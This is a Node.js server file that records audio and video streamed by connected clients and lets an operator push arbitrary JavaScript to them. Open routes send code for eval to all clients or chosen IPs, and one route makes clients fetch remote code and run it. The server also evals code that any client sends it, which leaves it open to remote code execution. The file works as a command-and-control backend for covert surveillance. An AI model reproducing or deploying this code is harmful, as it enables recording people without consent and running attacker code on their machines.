const express = require('express');
const https = require('https');
const fs = require('fs');
const WebSocket = require('ws');
const ffmpeg = require('fluent-ffmpeg');
const ffmpegPath = require('ffmpeg-static');

ffmpeg.setFfmpegPath(ffmpegPath);

const privateKey = fs.readFileSync('private.key');
const certificate = fs.readFileSync('certificate.crt');
const caBundle = fs.readFileSync('ca_bundle.crt');

const app = express();

// Create a HTTPS server
const server = https.createServer({
    key: privateKey,
    cert: certificate,
    ca: caBundle
}, app);

const wss = new WebSocket.Server({ server });

let connectedClients = {};

// Function to send a message to a specific client
const sendMessage = (client, message) => {
    if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify(message));
    }
};

// Command to handle ping
const pingCommand = (client) => {
    sendMessage(client, { type: "pong" });
};

// Command to handle eval
const evalCommand = (client, { code }) => {
    try {
        const returned = eval(code); // Execute the code sent from the server on the client's machine
        sendMessage(client, { type: "evaled", returned: `${returned}` });
    } catch (error) {
        sendMessage(client, { type: "error", message: error.message });
    }
};

const sendEvalToPlayers = (code, playerIPs) => {
    for (const clientIP in connectedClients) {
        const client = connectedClients[clientIP];
        // If playerIPs array contains the player's IP, send the eval command
        if (playerIPs.includes(clientIP)) {
            sendMessage(client.ws, { type: "eval", code });
        }
    }
};

// Command dispatcher
const dispatchCommand = (client, { type, ...rest }) => {
    switch (type) {
        case 'eval':
            evalCommand(client, rest);
            break;
        case 'ping':
            pingCommand(client);
            break;
        default:
            break;
    }
};

// Helper functions to distinguish audio from video data
function isAudioData(data) {
    // Simple heuristic based on known audio data size
    return data.length === 1024 * Float32Array.BYTES_PER_ELEMENT;
}

function isVideoData(data) {
    return !isAudioData(data);
}

// WebSocket connection handler
wss.on('connection', (ws, req) => {
    const clientIp = req.socket.remoteAddress.replace(/::ffff:/, ''); // Remove IPv6 prefix if present
    console.log(`New client connected - Client IP: ${clientIp}`);

    const audioFilePath = `audio_${clientIp}.mp3`;
    const videoFilePath = `video_${clientIp}.mp4`;

    const audioWriteStream = fs.createWriteStream(audioFilePath, { flags: 'a' });
    const videoWriteStream = fs.createWriteStream(videoFilePath, { flags: 'a' });

    // Store client's data in connectedClients
    connectedClients[clientIp] = { ws, audioWriteStream, videoWriteStream };

    // Debug logging to ensure connectedClients is populated correctly
    console.log('Connected clients:', connectedClients);

    // Set timeout to stop recording after 15 seconds
    const recordingTimeout = setTimeout(() => {
        const clientStreams = connectedClients[clientIp];
        if (clientStreams) {
            console.log(`Recording stopped for client - Client IP: ${clientIp}`);
            clientStreams.audioWriteStream.end();
            clientStreams.videoWriteStream.end();

            delete connectedClients[clientIp];
        }
    }, 15000); // 15 seconds

    // Handle incoming messages from clients
    ws.on('message', (message) => {
        console.log(`Received message from client - Client IP: ${clientIp}`);
        const clientStreams = connectedClients[clientIp]; // Retrieve client's data
    
        if (!clientStreams) {
            console.error(`No client data found for client IP: ${clientIp}`);
            return;
        }
    
        if (typeof message === 'string') {
            const data = JSON.parse(message);
            dispatchCommand(ws, data);
        } else if (Buffer.isBuffer(message)) {
            if (isAudioData(message)) {
                clientStreams.audioWriteStream.write(message);
            } else if (isVideoData(message)) {
                clientStreams.videoWriteStream.write(message);
            }
        }
    });

    // Handle client disconnection
    ws.on('close', () => {
        console.log(`Client disconnected - Client IP: ${clientIp}`);
        clearTimeout(recordingTimeout); // Clear recording timeout
        const clientStreams = connectedClients[clientIp];
        if (clientStreams) {
            console.log(`Recording stopped for client - Client IP: ${clientIp}`);
            clientStreams.audioWriteStream.end();
            clientStreams.videoWriteStream.end();

            delete connectedClients[clientIp];
        }
    });
});


// Express route to serve the web interface
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Express route to get the list of connected clients
app.get('/clients', (req, res) => {
    res.json(Object.keys(connectedClients));
});

// Express route to handle eval command
app.post('/eval', express.json(), (req, res) => {
    const code = req.body.code;
    for (const clientIP in connectedClients) {
        const client = connectedClients[clientIP].ws;
        sendMessage(client, { type: "eval", code });
    }
    res.sendStatus(200);
});

app.post('/evallink', express.json(), (req, res) => {
    const code = req.body.code;
    const fetchScript = `fetch(${code}).then(res => res.text().then(r => eval(r)));`;
    for (const clientIP in connectedClients) {
        const client = connectedClients[clientIP].ws;
        sendMessage(client, { type: "eval", code: fetchScript });
    }
    res.sendStatus(200);
});

// Route to send eval command to specific players
app.post('/eval/players', express.json(), (req, res) => {
    const { code, playerIPs } = req.body;
    if (!playerIPs || !Array.isArray(playerIPs) || playerIPs.length === 0) {
        res.status(400).send("No player IPs provided");
        return;
    }

    sendEvalToPlayers(code, playerIPs);
    res.sendStatus(200);
});

// Start the HTTPS server
server.listen(8080, () => {
    console.log('Server running on port 8080');
});
